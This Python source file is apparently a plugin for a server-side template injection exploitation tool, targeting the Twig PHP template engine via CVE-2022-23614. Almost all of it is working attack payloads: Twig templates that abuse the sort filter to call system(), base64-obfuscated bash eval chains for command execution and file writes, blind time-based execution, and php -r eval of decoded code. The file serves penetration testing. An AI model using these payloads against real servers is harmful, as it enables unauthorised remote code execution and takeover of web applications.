from plugins.languages import php
from core import bash
from utils import rand


class Twig(php.Php):
    def init(self):
        # Using CVE-2022-23614, it is possible to exploit Twig >=2.12 <2.14.11; >=3.0 <3.3.8
        # Only functions with 1 parameter can be mapped and eval()/assert() functions are not
        # allowed. For this reason, most of the stuff is done by exec() instead of eval()-like code.
        self.update_actions({
            'render': {
                'render': '{code}',
                # Disable errors, so that "system" will not corrupt the output with a warning
                'header': '{{% for a in ["error_reporting", "0"]|sort("ini_set") %}}{{% endfor %}}{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                # {{7*'7'}} and a{#b#}c work in freemarker as well
                # {%% set a=%i*%i %%}{{a}} works in Nunjucks as well
                'test_render': f'{{{{(1..3)|sort((x, y) => x < y)|join("")}}}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
                'test_render_expected': f'321{rand.randstrings[0]}<br />'
            },
            'write': {
                'call': 'inject',
                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'", ""]|sort("system") }}}}""",
                'truncate': """{{{{ ["echo -n >{path}", ""]|sort("system") }}}}"""
            },
            # Hackish way to evaluate PHP code
            'evaluate': {
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'execute': {
                'call': 'render',
                'execute': """{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'", ""]|sort("system") %}}{{% endfor %}}""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2] 
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'", ""]|sort("system") }}}}"""
            },
            'evaluate_blind': {
                'call': 'execute',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
            },
        })
        
        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': php.ctx_closures},
            {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '#}}', 'suffix': '{#'},
            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '', 'closures': php.ctx_closures},
            # This escapes string "inter#{"asd"}polation"
            {'level': 5, 'prefix': '{closure}}}', 'suffix': '', 'closures': php.ctx_closures},
            # This escapes string {% set %s = 1 %}
            {'level': 5, 'prefix': '{closure} = 1 %}}', 'suffix': '', 'closures': php.ctx_closures},
        ])
